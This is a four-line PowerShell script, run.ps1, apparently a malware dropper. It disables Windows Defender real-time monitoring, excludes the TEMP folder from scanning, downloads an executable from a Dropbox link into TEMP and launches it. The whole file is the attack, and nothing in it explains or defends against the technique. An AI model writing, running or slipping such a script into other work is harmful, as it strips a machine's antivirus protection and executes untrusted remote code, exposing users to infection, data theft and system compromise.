# run.ps1
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "$env:TEMP"
Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/ysgkf4itfcy4do4sh22ug/test.exe?rlkey=kb77xr8jjz91q5wyqepzksoq3&st=ufblgjqa&dl=1' -OutFile "$env:TEMP\test.exe"
Start-Process "$env:TEMP\test.exe"
